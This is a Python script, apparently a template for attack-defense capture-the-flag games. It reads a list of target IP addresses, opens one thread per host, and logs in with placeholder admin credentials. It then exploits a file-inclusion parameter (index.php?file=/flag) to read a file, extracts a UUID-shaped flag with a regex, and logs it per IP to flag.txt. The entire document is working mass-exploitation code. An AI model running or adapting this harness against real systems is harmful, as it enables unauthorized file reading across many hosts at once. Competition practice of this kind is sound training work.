#!/usr/bin/python3
# coding: utf-8

import requests
import threading
import queue
import re

'''
uuid 36
md5 32
sha1 40
sha256 64
'''
# flagpreg = 'flag\{(.*)\}'
flagpreg = '[\w|-]{36}'

q = queue.Queue()
lock = threading.Lock()

def getflag_submit(ip):
    url = f'http://{ip}:80/index.php?file=/flag'
    login_data = {
        'user': 'admin',
        'passwd': 'passwd'
    }
    back_data = {
        'a': 'x',
        'b': 'y'
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43'
    }

    try:
    # if True:
        req = requests.session()
        req.post(url=url, data=login_data, timeout=3)
        result = req.post(url=url, data=back_data, timeout=3)
        if result.status_code == 200:
            m = re.search(flagpreg, result.text, re.I)
            flag = m.group(0)
            print(f'[+] {ip} 获取flag成功')
            lock.acquire()
            with open('flag.txt', 'a') as f:
                f.write(f'{flag}:{ip}\n')
            print(flag)
            lock.release()
    except:
        print(f'[-] {ip} 获取flag失败')

def main():
    ips = []
    with open('ip.txt', 'r') as f:
        ips = f.readlines()

    th = []
    th_num = len(ips)
    for ip in ips:
        t=threading.Thread(target=getflag_submit, args=(ip.strip(),))
        th.append(t)
    for x in range(th_num):
        th[x].start()
    for x in range(th_num):
        th[x].join()
    # q.join()

main()